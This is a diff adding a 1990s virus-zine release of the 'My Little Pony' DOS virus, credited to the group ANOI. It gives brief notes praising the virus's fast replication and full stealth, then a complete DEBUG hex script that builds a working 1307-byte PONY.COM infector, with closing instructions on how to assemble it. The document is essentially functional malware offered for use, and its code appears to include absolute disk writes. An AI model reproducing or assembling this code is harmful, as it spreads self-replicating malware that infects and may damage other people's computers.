@@ -1,0 +1,129 @@
+
+            A   N E W   O R D E R   O F   I N T E L L I G E N C E
+
+
+                                   PRESENTS
+
+                             MY LITTLE PONY 1.00   
+
+-------------------------------------------------------------------------------
+                                  IR NOTES
+-------------------------------------------------------------------------------
+
+We once again have the oppotunity to include one of ANOI's viruses.
+Last time, it was CyberCide, and now, it's MY LITTLE PONY. Anyway,
+I havn't recieved a fully description about this viruses functions,
+but I'll tell you what I've learned from it. 
+
+This virus has got an extremely fast replicator, and it surely
+spreads fast! It infects all .COM files which are touched with
+a dos "dir". When resident, you'll not notice the file increace,
+(size stealth!), and if a file is opened for any reason, it'll
+disinfect that file.
+
+Yes!, this is a full stealth virus, don't believe what Patricia
+has to say about this virus, she totally screwed up the description
+on CyberCide. This by the way was written in the ground up in Sweden.
+
+I don't really know if this virus got some destructive code in
+it, but I bet it has! CyberCide for example, trashed one random
+sector on each hard drive every new hour (Patricia excluded that
+code, whatta disassembler master she must be, not).
+
+--------------- MY LITTLE PONY DEBUG, CUT HERE ------------------------------------
+N PONY.COM 
+E 100 E8 00 00 5D B8 22 DD CD 21 3D 33 3D 75 05 8D 56
+E 110 52 FF E2 B8 21 35 CD 21 89 9E 4E 01 8C 86 50 01
+E 120 8C C8 48 8E C0 26 A1 03 00 2B 86 B4 04 26 A3 03
+E 130 00 8B 86 B4 04 26 29 06 12 00 26 8E 06 12 00 06
+E 140 8D 76 FD BF 00 01 8B 8E B2 04 F3 A4 1F B8 21 25
+E 150 BA 0C 02 CD 21 0E 0E 1F 07 8D B6 15 05 B9 03 00
+E 160 BF 00 01 F3 A4 83 EF 03 FF E7 53 69 6D 70 6C 65
+E 170 20 53 69 6D 6F 6E 20 6D 65 74 20 61 20 70 69 65
+E 180 6D 61 6E 20 67 6F 69 6E 67 20 74 6F 20 74 68 65
+E 190 20 66 61 69 72 20 73 61 69 64 20 53 69 6D 70 6C
+E 1A0 65 20 53 69 6D 6F 6E 20 74 6F 20 74 68 65 20 70
+E 1b0 69 65 6D 61 6E 20 6C 65 74 20 6D 65 20 74 61 6B
+E 1c0 65 20 79 6F 75 72 20 77 61 72 65 80 FE 00 75 71
+E 1d0 80 FA 05 77 6C 9C 53 E8 A5 03 B9 0A 00 33 D2 F7
+E 1E0 F1 8B D0 B0 02 B9 01 00 BB A1 05 CD 26 9D FE C0
+E 1f0 3C 19 75 F7 5B 9D EB 49 28 63 29 31 39 39 33 20
+E 200 43 72 75 65 6C 20 45 6E 74 69 74 79 9C 3D 22 DD
+E 210 74 55 80 FC 11 74 5B 80 FC 12 74 56 80 FC 4E 74
+E 220 34 80 FC 4F 74 2F 80 FC 3D 74 30 80 FC 3E 74 31
+E 230 80 FC 2C 74 0F 50 51 52 B4 2C CD 21 80 F9 00 74
+E 240 8A 5A 59 58 80 FC 36 75 06 55 BD 2B 03 FF E5 9D
+E 250 EA 00 00 00 00 55 BD 13 04 FF E5 55 BD 9A 04 FF
+E 260 E5 55 BD 48 05 FF E5 9D B8 33 3D CF 2E FF 2E 51
+E 270 02 C3 9D 9C 0E E8 F4 FF 3C FF 74 56 9C 50 53 51
+E 280 52 56 57 1E 06 55 B4 2F CD 21 06 1F 8B F3 83 C6
+E 290 10 AD 3D 43 4F 75 31 AC 3C 4D 75 2C 8B F3 83 C6
+E 2A0 26 AD 3D 00 00 75 21 8B F3 83 C6 1E AD 24 1F 3C
+E 2b0 0A 74 05 BA 0A 03 FF E2 8B F3 83 C6 24 8B FE AD
+E 2c0 2E 2B 06 B5 05 74 01 AB 5D 07 1F 5F 5E 5A 59 5B
+E 2d0 58 9D CA 02 00 25 25 25 20 4D 59 20 4C 49 54 54
+E 2E0 4C 45 20 50 4F 4E 59 20 25 25 25 20 43 4F 50 59
+E 2f0 52 49 47 48 54 28 43 29 20 31 39 39 33 20 41 2E
+E 300 4E 2E 4F 2E 49 2E 20 25 25 25 8B F3 83 C6 08 0E
+E 310 07 B9 0A 00 BF B9 05 26 80 3D 20 74 07 83 C7 08
+E 320 E2 F5 EB A4 B9 08 00 F3 A4 EB 9D 5D 50 53 51 52
+E 330 56 57 1E 06 55 0E 0E 1F 07 BF B9 05 B9 0A 00 80
+E 340 3D 20 74 0E 57 51 8B F7 E8 20 00 59 5F 83 C7 08
+E 350 E2 ED 0E 07 BF B9 05 B9 5C 00 B0 20 F3 AA 5D 07
+E 360 1F 5F 5E 5A 59 5B 58 9D E9 E5 FE BF 09 06 B9 08
+E 370 00 AC 3C 20 74 03 AA E2 F8 B0 2E AA B0 43 AA B0
+E 380 4F AA B0 4D AA B0 00 AA 0E 1F B8 00 43 BA 09 06
+E 390 CD 21 73 01 C3 51 33 C9 B8 01 43 CD 21 B8 02 3D
+E 3A0 BA 09 06 9C 0E E8 C4 FE 8B D8 B8 00 57 CD 21 52
+E 3b0 51 80 E1 1F 80 F9 0A 75 05 BA F5 03 FF E2 B4 3F
+E 3c0 B9 03 00 BA 18 06 CD 21 B8 02 42 33 D2 33 C9 CD
+E 3d0 21 2D 03 00 A3 16 06 B4 40 BA 00 01 8B 0E B5 05
+E 3E0 CD 21 B8 00 42 33 D2 33 C9 CD 21 B4 40 B9 03 00
+E 3f0 BA 15 06 CD 21 59 5A 80 E1 E0 80 C9 0A B8 01 57
+E 400 CD 21 B4 3E 9C 0E E8 63 FE B8 01 43 BA 09 06 59
+E 410 CD 21 C3 5D 9D 9C 0E E8 52 FE 73 03 CA 02 00 9C
+E 420 50 53 51 52 56 57 1E 06 55 B4 2F CD 21 06 1F 8B
+E 430 F3 0E 07 83 C6 1E BF 09 06 B9 19 00 AC 3C 00 74
+E 440 03 AA E2 F8 B0 00 AA 1E 07 0E 1F 8B F7 83 EE 04
+E 450 AD 3D 43 4F 74 05 3D 63 6F 75 32 AC 3C 6D 74 04
+E 460 3C 4D 75 29 06 1F 8B F3 83 C6 1C AD 3D 00 00 75
+E 470 1C 8B F3 83 C6 16 AD 24 1F 3C 0A 75 10 8B F3 83
+E 480 C6 1A 8B FE AD 2E 2B 06 B5 05 74 01 AB 5D 07 1F
+E 490 5F 5E 5A 59 5B 58 9D CA 02 00 5D 50 53 51 52 56
+E 4A0 57 55 1E 06 B0 2E 1E 07 8B FA B9 32 00 F2 AE 8B
+E 4b0 F7 AD 3D 43 4F 74 0A 3D 63 6F 74 05 BA 36 05 FF
+E 4c0 E2 AC 3C 6D 74 04 3C 4D 75 6C B8 02 3D 9C 0E E8
+E 4d0 9A FD 72 62 8B D8 0E 1F 0E 07 B8 00 57 CD 21 80
+E 4E0 E1 1F 80 F9 0A 75 4F B8 02 42 33 D2 33 C9 CD 21
+E 4f0 50 2D 03 00 8B D0 B8 00 42 B9 00 00 CD 21 B4 3F
+E 500 B9 03 00 BA B2 05 CD 21 B8 00 42 33 C9 33 D2 CD
+E 510 21 B4 40 B9 03 00 BA B2 05 CD 21 5A 2B 16 B5 05
+E 520 B8 00 42 B9 00 00 CD 21 B4 40 B9 00 00 CD 21 B4
+E 530 3E 9C 0E E8 36 FD 07 1F 5D 5F 5E 5A 59 5B 58 9D
+E 540 9C 0E E8 27 FD CA 02 00 5D 50 53 51 52 56 57 55
+E 550 1E 06 B8 20 12 CD 2F 26 8A 1D B8 16 12 CD 2F 8B
+E 560 EF 83 C7 28 06 1F 8B F7 AD 3D 43 4F 75 C8 AC 3C
+E 570 4D 75 C3 8B F5 83 C6 20 0E 07 E8 EE FD EB B7 52
+E 580 51 53 E4 40 05 00 00 BA 00 00 B9 07 00 D1 E0 D1
+E 590 D2 8A D8 32 DE 79 02 FE C0 E2 F2 5B 8A C2 59 5A
+E 5A0 C3 3E 3E 3E 20 20 41 2E 4E 2E 4F 2E 49 20 20 3C
+E 5b0 3C 3C 00 00 00 1B 05 64 00 20 20 20 20 20 20 20
+E 5c0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20
+E 5d0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20
+E 5E0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20
+E 5f0 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20 20
+E 600 20 20 20 20 20 20 20 20 20 00 00 00 00 00 00 00
+E 610 00 00 00 00 00 E9 00 00 90 CD 20 
+RCX
+51b
+W
+Q
+
+----------------- END OF DEBUG --------------------------------------------
+
+   We included this virus with fully permission from the creator of it.
+   If you wanna make this to a com file, save the virus to a file, by
+   pressing the F1 key, and then write: DEBUG <FILENAME, then you'll
+   have a 1307 .com file called PONY.COM, Enjoy!
+
+---------------------------------------------------------------------------
